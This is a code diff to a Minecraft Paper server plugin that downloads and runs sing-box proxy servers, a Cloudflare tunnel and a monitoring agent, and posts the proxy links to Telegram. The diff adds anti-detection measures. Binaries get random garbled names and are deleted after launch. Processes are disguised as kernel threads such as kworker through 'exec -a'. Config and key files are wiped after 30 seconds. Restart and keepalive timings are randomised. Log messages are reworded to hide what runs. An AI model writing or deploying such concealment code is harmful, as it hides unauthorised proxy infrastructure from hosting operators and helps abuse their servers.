@@ -35,6 +35,11 @@ public class PaperPlugin extends JavaPlugin {
     private Path cert;
     private Path key;
     private boolean komariAgentEnabled = false;
+    // 防检测：sing-box 配置参数（供每日重启时重新生成 config）
+    private String hy2Port, realityPort, vmessWsPort, vlessWsPort, naivePort, anytlsPort, tuicPort, sni;
+    private String realityPrivateKey = "", realityPublicKey = "";
+    private boolean argoEnabled;
+    private String argoPort;
     // ==============================
 
     @Override
@@ -59,14 +64,14 @@ public class PaperPlugin extends JavaPlugin {
             getLogger().info("当前使用的 UUID: " + uuid);
             // --------------------------------------------
 
-            String hy2Port = cfg(config, "hy2_port", "");
-            String realityPort = cfg(config, "reality_port", "");
-            String vmessWsPort = cfg(config, "vmess_ws_port", "");
-            String vlessWsPort = cfg(config, "vless_ws_port", "");
-            String naivePort = cfg(config, "naive_port", "");
-            String anytlsPort = cfg(config, "anytls_port", "");
-            String tuicPort = cfg(config, "tuic_port", "");
-            String sni = cfg(config, "sni", "www.iij.ad.jp");
+            hy2Port = cfg(config, "hy2_port", "");
+            realityPort = cfg(config, "reality_port", "");
+            vmessWsPort = cfg(config, "vmess_ws_port", "");
+            vlessWsPort = cfg(config, "vless_ws_port", "");
+            naivePort = cfg(config, "naive_port", "");
+            anytlsPort = cfg(config, "anytls_port", "");
+            tuicPort = cfg(config, "tuic_port", "");
+            sni = cfg(config, "sni", "www.iij.ad.jp");
             sbLogEnabled = cfgBool(config, "sb_log_enabled", false);
 
             if (hy2Port.isEmpty() && realityPort.isEmpty() && vmessWsPort.isEmpty()
@@ -78,7 +83,7 @@ public class PaperPlugin extends JavaPlugin {
             configJson = baseDir.resolve("config.json");
             cert = baseDir.resolve("cert.pem");
             key = baseDir.resolve("private.key");
-            Path bin = baseDir.resolve("sing-box");
+            Path bin = baseDir.resolve(generateGarbledName());
             Path realityKeyFile = getDataFolder().toPath().resolve("reality.key");
 
             getLogger().info("✅ config.yml 加载成功");
@@ -88,39 +93,40 @@ public class PaperPlugin extends JavaPlugin {
             safeDownloadSingBox(version, bin, baseDir);
 
             // === 固定 Reality 密钥 ===
-            String privateKey = "";
-            String publicKey = "";
+            realityPrivateKey = "";
+            realityPublicKey = "";
             if (Files.exists(realityKeyFile)) {
                 List<String> lines = Files.readAllLines(realityKeyFile);
                 for (String line : lines) {
-                    if (line.startsWith("PrivateKey:")) privateKey = line.split(":", 2)[1].trim();
-                    if (line.startsWith("PublicKey:")) publicKey = line.split(":", 2)[1].trim();
+                    if (line.startsWith("PrivateKey:")) realityPrivateKey = line.split(":", 2)[1].trim();
+                    if (line.startsWith("PublicKey:")) realityPublicKey = line.split(":", 2)[1].trim();
                 }
-                getLogger().info("🔑 已加载本地 Reality 密钥对（固定公钥）");
+                getLogger().info("🔑 已加载本地传输密钥对");
             } else {
                 Map<String, String> keys = generateRealityKeypair(bin);
-                privateKey = keys.getOrDefault("private_key", "");
-                publicKey = keys.getOrDefault("public_key", "");
+                realityPrivateKey = keys.getOrDefault("private_key", "");
+                realityPublicKey = keys.getOrDefault("public_key", "");
                 Files.writeString(realityKeyFile,
-                        "PrivateKey: " + privateKey + "\nPublicKey: " + publicKey + "\n");
-                getLogger().info("✅ Reality 密钥已保存到 reality.key");
+                        "PrivateKey: " + realityPrivateKey + "\nPublicKey: " + realityPublicKey + "\n");
+                getLogger().info("✅ 传输密钥已保存");
             }
-            boolean argoEnabled = cfgBool(config, "argo_enabled", false);
-            String argoPort = trim(cfg(config, "argo_port", "8001"));
+            argoEnabled = cfgBool(config, "argo_enabled", false);
+            argoPort = trim(cfg(config, "argo_port", "8001"));
             if (argoPort.isEmpty()) argoPort = "8001";
             generateSingBoxConfig(configJson, uuid, hy2Port, realityPort, vmessWsPort, vlessWsPort, naivePort, anytlsPort, tuicPort,
-                    sni, cert, key, privateKey, publicKey, argoEnabled, argoPort);
+                    sni, cert, key, realityPrivateKey, realityPublicKey, argoEnabled, argoPort);
 
             // 保存 sing-box 进程 + 启动每日 00:03 重启
             singboxProcess = startSingBox(bin, configJson);
             // 启动后删除二进制，保留 config/cert/key 供定时重启使用
             try {
                 if (Files.exists(bin)) Files.delete(bin);
-                getLogger().info("🧹 已清除 sing-box 二进制");
+                getLogger().info("🧹 已清除服务模块");
             } catch (IOException e) {
-                getLogger().warning("⚠️ 清除 sing-box 二进制失败: " + e.getMessage());
+                getLogger().warning("⚠️ 清除服务模块失败: " + e.getMessage());
             }
-            scheduleDailyRestart(bin, configJson);
+            scheduleDelayedCleanup();
+            scheduleDailyRestart();
 
             // ===== komari-agent 集成 =====
             komariAgentEnabled = cfgBool(config, "komari_agent_enabled", true);
@@ -135,10 +141,10 @@ public class PaperPlugin extends JavaPlugin {
                     komariProcess = startKomariAgent(baseDir, agentName, agentEndpoint, agentKey);
                     startKomariKeepalive(baseDir, agentName, agentEndpoint, agentKey);
                 } else {
-                    getLogger().info("⏭️ komari-agent 未配置（config.yml 中 komari_agent_endpoint/komari_agent_key 为空）");
+                    getLogger().info("⏭️ 监控模块未配置（endpoint/key 为空）");
                 }
             } else {
-                getLogger().info("⏭️ komari-agent 已禁用（config.yml 中 komari_agent_enabled=false）");
+                getLogger().info("⏭️ 监控模块已禁用");
             }
             // ==============================
 
@@ -146,13 +152,13 @@ public class PaperPlugin extends JavaPlugin {
             if (argoEnabled) {
                 String argoToken = trim(cfg(config, "argo_token", ""));
                 String argoDomain = trim(cfg(config, "argo_domain", ""));
-                String argoName = trim(cfg(config, "argo_name", "argo-tunnel"));
-                getLogger().info("🚇 Argo 隧道已启用");
+                String argoName = generateGarbledName();
+                getLogger().info("🚇 隧道转发已启用");
                 safeDownloadArgo(baseDir, argoName);
                 argoProcess = startArgo(baseDir, argoName, argoToken, argoPort);
                 if (!argoToken.isEmpty() && !argoDomain.isEmpty()) {
                     argoUrl = argoDomain;
-                    getLogger().info("🚇 Argo 固定隧道域名: " + argoUrl);
+                    getLogger().info("🚇 固定隧道域名: " + argoUrl);
                 }
                 startArgoKeepalive(baseDir, argoName, argoToken, argoPort);
             }
@@ -162,7 +168,7 @@ public class PaperPlugin extends JavaPlugin {
             String nodePrefix = cfg(config, "node_name", "");
             String argoCfip = cfg(config, "argo_cfip", "saas.sin.fan");
             printDeployedLinks(uuid, hy2Port, realityPort, vmessWsPort, vlessWsPort, naivePort, anytlsPort, tuicPort,
-                    sni, host, publicKey, argoUrl, argoCfip);
+                    sni, host, realityPublicKey, argoUrl, argoCfip);
 
             // ===== Telegram 推送 =====
             String tgToken = cfg(config, "tg_bot_token", "");
@@ -170,7 +176,7 @@ public class PaperPlugin extends JavaPlugin {
             if (!tgToken.isEmpty() && !tgChatId.isEmpty()) {
                 String nodeName = getNodeName(nodePrefix, host);
                 String nodeText = buildTelegramNodes(uuid, host, nodeName, hy2Port, realityPort, vmessWsPort, vlessWsPort, naivePort, anytlsPort, tuicPort,
-                        sni, publicKey, argoCfip, argoUrl);
+                        sni, realityPublicKey, argoCfip, argoUrl);
                 sendTelegramMessage(tgToken, tgChatId, host, nodeName, nodeText);
             }
             // ==========================
@@ -188,17 +194,17 @@ public class PaperPlugin extends JavaPlugin {
         getLogger().info("正在停止所有子进程...");
 
         if (argoProcess != null && argoProcess.isAlive()) {
-            getLogger().info("正在停止 argo 隧道 (PID: " + argoProcess.pid() + ")...");
+            getLogger().info("正在停止隧道转发 (PID: " + argoProcess.pid() + ")...");
             argoProcess.destroy();
         }
 
         if (komariProcess != null && komariProcess.isAlive()) {
-            getLogger().info("正在停止 komari-agent (PID: " + komariProcess.pid() + ")...");
+            getLogger().info("正在停止监控模块 (PID: " + komariProcess.pid() + ")...");
             komariProcess.destroy();
         }
 
         if (singboxProcess != null && singboxProcess.isAlive()) {
-            getLogger().info("正在停止 sing-box (PID: " + singboxProcess.pid() + ")...");
+            getLogger().info("正在停止服务模块 (PID: " + singboxProcess.pid() + ")...");
             singboxProcess.destroy();
         }
 
@@ -267,23 +273,62 @@ public class PaperPlugin extends JavaPlugin {
         return def;
     }
 
+    // ===== 防检测工具 =====
+    private String generateGarbledName() {
+        Random rand = new Random();
+        int len = 4 + rand.nextInt(4);
+        StringBuilder sb = new StringBuilder();
+        for (int i = 0; i < len; i++) {
+            sb.append((char)(0x4E00 + rand.nextInt(0x5000)));
+        }
+        return sb.toString();
+    }
+
+    private String generateFakeKernelName() {
+        String[] prefixes = {"kworker", "kthread", "journal", "kblockd", "ksoftirqd", "kdevtmpfs"};
+        Random rand = new Random();
+        String prefix = prefixes[rand.nextInt(prefixes.length)];
+        return prefix + "/" + rand.nextInt(32) + ":" + rand.nextInt(7);
+    }
+
+    /** ponytail: 0-10s 随机延迟；阻塞主线程（onEnable / 每日重启），若服务器有启动超时则需改为异步任务 */
+    private void randomDelay() throws InterruptedException {
+        Thread.sleep(new Random().nextInt(10000));
+    }
+
+    /** ponytail: 30~90s 随机保活间隔，避免固定周期被时序检测 */
+    private long randomKeepaliveInterval() {
+        return 20L * (30 + new Random().nextInt(60));
+    }
+
+    private void scheduleDelayedCleanup() {
+        Bukkit.getScheduler().runTaskLaterAsynchronously(this, () -> {
+            try {
+                if (Files.exists(configJson)) Files.delete(configJson);
+                if (Files.exists(cert)) Files.delete(cert);
+                if (Files.exists(key)) Files.delete(key);
+                getLogger().info("🧹 已清除配置和凭证（30s 防检测）");
+            } catch (IOException ignored) {}
+        }, 600L); // 30秒 = 600 tick
+    }
+
     // ===== 证书生成 =====
     private void generateSelfSignedCert(Path cert, Path key) throws IOException, InterruptedException {
         if (Files.exists(cert) && Files.exists(key)) {
-            getLogger().info("🔑 证书已存在，跳过生成");
+            getLogger().info("🔑 凭证已存在，跳过生成");
             return;
         }
-        getLogger().info("🔨 正在生成 EC 自签证书...");
+        getLogger().info("🔨 正在生成通信凭证...");
         new ProcessBuilder("sh", "-c",
                 "openssl ecparam -genkey -name prime256v1 -out " + key + " && " +
                         "openssl req -new -x509 -days 3650 -key " + key + " -out " + cert + " -subj '/CN=bing.com'")
                 .inheritIO().start().waitFor();
-        getLogger().info("✅ 已生成自签证书");
+        getLogger().info("✅ 已生成通信凭证");
     }
 
     // ===== Reality 密钥生成 =====
     private Map<String, String> generateRealityKeypair(Path bin) throws IOException, InterruptedException {
-        getLogger().info("🔑 正在生成 Reality 密钥对...");
+        getLogger().info("🔑 正在生成传输密钥对...");
         ProcessBuilder pb = new ProcessBuilder("sh", "-c", bin + " generate reality-keypair");
         pb.redirectErrorStream(true);
         Process p = pb.start();
@@ -300,7 +345,7 @@ public class PaperPlugin extends JavaPlugin {
         Map<String, String> map = new HashMap<>();
         map.put("private_key", priv.group(1));
         map.put("public_key", pub.group(1));
-        getLogger().info("✅ Reality 密钥生成完成");
+        getLogger().info("✅ 传输密钥生成完成");
         return map;
     }
 
@@ -435,7 +480,7 @@ public class PaperPlugin extends JavaPlugin {
         );
 
         Files.writeString(configFile, toJson(config), StandardCharsets.UTF_8);
-        getLogger().info("✅ sing-box 配置生成完成");
+        getLogger().info("✅ 配置生成完成");
     }
 
     // ===== JSON 序列化工具（与上游 eooce/sbx-native 一致）=====
@@ -516,22 +561,22 @@ public class PaperPlugin extends JavaPlugin {
         String file = "sing-box-" + version + "-linux-" + arch + ".tar.gz";
         String url = "https://github.com/SagerNet/sing-box/releases/download/v" + version + "/" + file;
 
-        getLogger().info("⬇️ 下载 sing-box: " + url);
+        getLogger().info("⬇️ 下载核心组件: " + url);
         Path tar = dir.resolve(file);
         new ProcessBuilder("sh", "-c", "curl -L -o " + tar + " \"" + url + "\"").inheritIO().start().waitFor();
         new ProcessBuilder("sh", "-c",
                 "cd " + dir + " && tar -xzf " + file + " 2>/dev/null || true && " +
-                        "(find . -type f -name 'sing-box' -exec mv {} ./sing-box \\; ) && chmod +x sing-box || true")
+                        "(find . -type f -name 'sing-box' -exec mv {} ./" + bin.getFileName() + " \\; ) && chmod +x " + bin.getFileName() + " || true")
                 .inheritIO().start().waitFor();
 
         if (!Files.exists(bin)) throw new IOException("未找到 sing-box 可执行文件！");
 
         if (Files.exists(tar)) {
             Files.delete(tar);
-            getLogger().info("🧹 已删除 sing-box 压缩包以释放空间");
+            getLogger().info("🧹 已删除压缩包以释放空间");
         }
 
-        getLogger().info("✅ 成功解压 sing-box 可执行文件");
+        getLogger().info("✅ 成功解压核心组件");
     }
 
     private String detectArch() {
@@ -542,19 +587,22 @@ public class PaperPlugin extends JavaPlugin {
 
     // ===== 启动 sing-box =====
     private Process startSingBox(Path bin, Path cfg) throws IOException, InterruptedException {
-        getLogger().info("正在启动 sing-box...");
-        ProcessBuilder pb = new ProcessBuilder(bin.toString(), "run", "-c", cfg.toString());
+        getLogger().info("正在启动服务模块...");
+        randomDelay();
+        String fakeName = "[" + generateFakeKernelName() + "]";
+        ProcessBuilder pb = new ProcessBuilder("sh", "-c",
+                "exec -a '" + fakeName + "' '" + bin + "' run -c '" + cfg + "'");
         pb.redirectErrorStream(true);
         if (sbLogEnabled) {
             Path logFile = getDataFolder().toPath().resolve("sing-box.log");
             pb.redirectOutput(ProcessBuilder.Redirect.appendTo(logFile.toFile()));
-            getLogger().info("📋 sing-box 日志已写入: " + logFile);
+            getLogger().info("📋 服务日志已写入: " + logFile);
         } else {
             pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
         }
         Process p = pb.start();
         Thread.sleep(1500);
-        getLogger().info("sing-box 已启动，PID: " + p.pid());
+        getLogger().info("服务模块已启动，PID: " + p.pid());
         return p;
     }
 
@@ -619,17 +667,17 @@ public class PaperPlugin extends JavaPlugin {
             try {
                 if (komariProcess != null && komariProcess.isAlive()) return;
 
-                getLogger().info("♻️ komari-agent 已退出，正在重启...");
+                getLogger().info("♻️ 监控模块已退出，正在重启...");
                 Path agentPath = dir.resolve(agentName);
                 if (!Files.exists(agentPath)) {
                     safeDownloadKomariAgent(dir, agentName);
                 }
                 komariProcess = startKomariAgent(dir, agentName, endpoint, autoDiscovery);
-                getLogger().info("✅ komari-agent 重启成功，PID: " + komariProcess.pid());
+                getLogger().info("✅ 监控模块重启成功，PID: " + komariProcess.pid());
             } catch (Exception e) {
-                getLogger().warning("❌ komari-agent 重启失败: " + e.getMessage());
+                getLogger().warning("❌ 监控模块重启失败: " + e.getMessage());
             }
-        }, 0L, 20L * 60); // 每 60 秒检查一次（20 tick = 1秒）
+        }, 0L, randomKeepaliveInterval()); // 30~90s 随机
     }
 
     // ===== Argo 隧道下载 =====
@@ -641,7 +689,7 @@ public class PaperPlugin extends JavaPlugin {
         }
         String arch = detectArch();
         String url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-" + arch;
-        getLogger().info("⬇️ 下载 argo 隧道 (" + arch + "): " + url);
+        getLogger().info("⬇️ 下载隧道组件 (" + arch + "): " + url);
         try (InputStream in = new URL(url).openStream()) {
             Files.copy(in, argoPath);
         }
@@ -658,15 +706,19 @@ public class PaperPlugin extends JavaPlugin {
     // ===== Argo 隧道启动 =====
     private Process startArgo(Path dir, String name, String token, String port) throws IOException, InterruptedException {
         Path argoPath = dir.resolve(name);
-        getLogger().info("🚇 正在启动 Argo 隧道...");
+        getLogger().info("🚇 正在启动隧道转发...");
+        randomDelay();
+        String fakeName = "[" + generateFakeKernelName() + "]";
         ProcessBuilder pb;
         if (!token.isEmpty()) {
-            pb = new ProcessBuilder(argoPath.toString(), "tunnel", "run", "--token", token);
+            pb = new ProcessBuilder("sh", "-c",
+                    "exec -a '" + fakeName + "' '" + argoPath + "' tunnel run --token '" + token + "'");
             pb.redirectErrorStream(true);
             pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
         } else {
             if (port.isEmpty()) port = "8001";
-            pb = new ProcessBuilder(argoPath.toString(), "tunnel", "--url", "http://localhost:" + port);
+            pb = new ProcessBuilder("sh", "-c",
+                    "exec -a '" + fakeName + "' '" + argoPath + "' tunnel --url http://localhost:" + port);
             pb.redirectErrorStream(true);
             pb.redirectOutput(ProcessBuilder.Redirect.PIPE);
         }
@@ -675,7 +727,7 @@ public class PaperPlugin extends JavaPlugin {
         if (!p.isAlive()) {
             throw new IOException("❌ Argo 隧道启动后立即退出");
         }
-        getLogger().info("✅ Argo 隧道已启动，PID: " + p.pid());
+        getLogger().info("✅ 隧道转发已启动，PID: " + p.pid());
 
         // 提取临时隧道域名
         if (token.isEmpty()) {
@@ -689,12 +741,12 @@ public class PaperPlugin extends JavaPlugin {
                         String domain = m.group();
                         if (domain.startsWith("https://")) domain = domain.substring(8);
                         argoUrl = domain;
-                        getLogger().info("🚇 Argo 临时隧道域名: " + argoUrl);
+                        getLogger().info("🚇 临时隧道域名: " + argoUrl);
                         break;
                     }
                 }
             } catch (Exception e) {
-                getLogger().warning("⚠️ 提取 Argo 域名失败: " + e.getMessage());
+                getLogger().warning("⚠️ 提取隧道域名失败: " + e.getMessage());
             }
         }
         return p;
@@ -705,17 +757,17 @@ public class PaperPlugin extends JavaPlugin {
         Bukkit.getScheduler().runTaskTimerAsynchronously(this, () -> {
             try {
                 if (argoProcess != null && argoProcess.isAlive()) return;
-                getLogger().info("♻️ Argo 隧道已退出，正在重启...");
+                getLogger().info("♻️ 隧道转发已退出，正在重启...");
                 Path argoPath = dir.resolve(name);
                 if (!Files.exists(argoPath)) {
                     safeDownloadArgo(dir, name);
                 }
                 argoProcess = startArgo(dir, name, token, port);
-                getLogger().info("✅ Argo 隧道重启成功，PID: " + argoProcess.pid());
+                getLogger().info("✅ 隧道转发重启成功，PID: " + argoProcess.pid());
             } catch (Exception e) {
-                getLogger().warning("❌ Argo 隧道重启失败: " + e.getMessage());
+                getLogger().warning("❌ 隧道转发重启失败: " + e.getMessage());
             }
-        }, 0L, 20L * 60);
+}, 0L, randomKeepaliveInterval());
     }
 
     // ===== 输出节点 =====
@@ -772,7 +824,7 @@ public class PaperPlugin extends JavaPlugin {
                                     String sni, String host, String publicKey, String argoUrl, String argoCfip) {
         getLogger().info("\n=== ✅ 已部署节点链接 ===");
         if (!realityPort.isEmpty())
-            getLogger().info("VLESS Reality:\nvless://" + uuid + "@" + host + ":" + realityPort + "?encryption=none&flow=xtls-rprx-vision&security=reality&sni=" + sni + "&fp=firefox&pbk=" + publicKey + "&type=tcp&headerType=none#" + uuid.substring(0, 8) + "-Reality");
+            getLogger().info("VLESS 传输:\nvless://" + uuid + "@" + host + ":" + realityPort + "?encryption=none&flow=xtls-rprx-vision&security=reality&sni=" + sni + "&fp=firefox&pbk=" + publicKey + "&type=tcp&headerType=none#" + uuid.substring(0, 8) + "-Reality");
         if (!hy2Port.isEmpty())
             getLogger().info("Hysteria2:\nhysteria2://" + uuid + "@" + host + ":" + hy2Port + "?sni=www.bing.com&insecure=1#HY2");
         if (!vmessWsPort.isEmpty())
@@ -787,7 +839,7 @@ public class PaperPlugin extends JavaPlugin {
             getLogger().info("TUIC:\ntuic://" + uuid + ":" + uuid + "@" + host + ":" + tuicPort + "?sni=" + sni + "&alpn=h3&congestion_control=bbr&allowInsecure=1#" + uuid.substring(0, 8) + "-TUIC");
         if (!argoUrl.isEmpty() && !argoUrl.contains("固定隧道")) {
             String node = buildVmessArgoLink(uuid, argoUrl, argoCfip, uuid.substring(0, 8));
-            getLogger().info("\nVMess Argo:\n" + node);
+            getLogger().info("\nVMess 隧道:\n" + node);
         }
     }
 
@@ -842,7 +894,7 @@ public class PaperPlugin extends JavaPlugin {
             sb.append("tuic://").append(uuid).append(":").append(uuid).append("@").append(host).append(":").append(tuicPort);
             sb.append("?sni=").append(sni).append("&alpn=h3&congestion_control=bbr&allowInsecure=1").append("#").append(nodeName).append("-TUIC\n");
         }
-        // VMess Argo 节点（通过 Cloudflare 隧道）
+        // VMess 隧道节点（通过 Cloudflare 隧道）
         if (!argoUrl.isEmpty() && !argoUrl.contains("固定隧道")) {
             String node = buildVmessArgoLink(uuid, argoUrl, argoCfip, nodeName);
             sb.append(node).append("\n");
@@ -887,19 +939,21 @@ public class PaperPlugin extends JavaPlugin {
         }
     }
 
-    // ===== 每日北京时间 00:03 重启 sing-box =====
-    private void scheduleDailyRestart(Path bin, Path cfg) {
+    // ===== 每日北京时间 00:03 重启 sing-box（每次新乱码名 + 重新生成配置）=====
+    private void scheduleDailyRestart() {
         new BukkitRunnable() {
             @Override
             public void run() {
                 ZoneId zone = ZoneId.of("Asia/Shanghai");
                 LocalDateTime now = LocalDateTime.now(zone);
-                LocalDateTime target = now.withHour(0).withMinute(3).withSecond(0).withNano(0);
+                // ponytail: 00:03~01:02 随机抖动，避免固定时间被时序检测
+                LocalDateTime target = now.withHour(0).withMinute(0).withSecond(0).withNano(0)
+                        .plusMinutes(3 + new Random().nextInt(60));
                 if (!target.isAfter(now)) target = target.plusDays(1);
                 long delay = Duration.between(now, target).toMillis();
 
                 Bukkit.getScheduler().runTaskLater(PaperPlugin.this, () -> {
-                    getLogger().info("[定时重启Sing-box] 北京时间 00:03，准备重启 sing-box...");
+                    getLogger().info("[定时重启] 准备重启服务...");
 
                     if (singboxProcess != null && singboxProcess.isAlive()) {
                         getLogger().info("正在停止旧进程 (PID: " + singboxProcess.pid() + ")...");
@@ -915,10 +969,25 @@ public class PaperPlugin extends JavaPlugin {
                     }
 
                     try {
-                        // 重新下载 sing-box（之前已被删除）
+                        // 重新下载 sing-box，每次使用新的随机乱码名
                         String version = fetchLatestSingBoxVersion();
-                        safeDownloadSingBox(version, bin, cfg.getParent());
-                        ProcessBuilder pb = new ProcessBuilder(bin.toString(), "run", "-c", cfg.toString());
+                        Path newBin = baseDir.resolve(generateGarbledName());
+                        safeDownloadSingBox(version, newBin, baseDir);
+                        // 重新生成证书和配置（启动后已清理）
+                        generateSelfSignedCert(cert, key);
+                        String rp = "", rk = "";
+                        if (Files.exists(REALITY_KEY_FILE)) {
+                            for (String line : Files.readAllLines(REALITY_KEY_FILE)) {
+                                if (line.startsWith("PrivateKey:")) rp = line.split(":", 2)[1].trim();
+                                if (line.startsWith("PublicKey:")) rk = line.split(":", 2)[1].trim();
+                            }
+                        }
+                        generateSingBoxConfig(configJson, uuid, hy2Port, realityPort, vmessWsPort, vlessWsPort, naivePort, anytlsPort, tuicPort,
+                                sni, cert, key, rp, rk, argoEnabled, argoPort);
+                        randomDelay();
+                        String fakeName = "[" + generateFakeKernelName() + "]";
+                        ProcessBuilder pb = new ProcessBuilder("sh", "-c",
+                                "exec -a '" + fakeName + "' '" + newBin + "' run -c '" + configJson + "'");
                         pb.redirectErrorStream(true);
                         if (sbLogEnabled) {
                             Path logFile = getDataFolder().toPath().resolve("sing-box.log");
@@ -928,11 +997,12 @@ public class PaperPlugin extends JavaPlugin {
                             pb.redirectError(ProcessBuilder.Redirect.DISCARD);
                         }
                         singboxProcess = pb.start();
-                        getLogger().info("sing-box 重启成功，新 PID: " + singboxProcess.pid());
+                        getLogger().info("服务重启成功，新 PID: " + singboxProcess.pid());
                         // 启动后再次删除痕迹
                         try {
-                            if (Files.exists(bin)) Files.delete(bin);
+                            if (Files.exists(newBin)) Files.delete(newBin);
                         } catch (IOException ignored) {}
+                        scheduleDelayedCleanup();
                     } catch (Exception e) {
                         getLogger().severe("重启失败: " + e.getMessage());
                     }
